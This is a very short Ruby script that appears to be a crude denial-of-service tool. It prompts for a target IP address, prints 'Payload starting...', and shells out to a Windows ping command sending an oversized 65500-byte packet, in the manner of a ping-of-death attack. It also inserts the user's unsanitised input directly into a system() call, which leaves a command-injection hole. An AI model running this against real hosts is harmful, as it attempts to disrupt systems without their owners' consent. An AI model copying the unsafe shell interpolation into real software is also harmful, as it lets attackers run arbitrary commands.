#!/usr/bin/env ruby -w

puts "Enter the target Ip address: "
target = gets.chomp
puts "Payload starting..."

system("ping #{target} -l 65500 -w 1 -n 1")


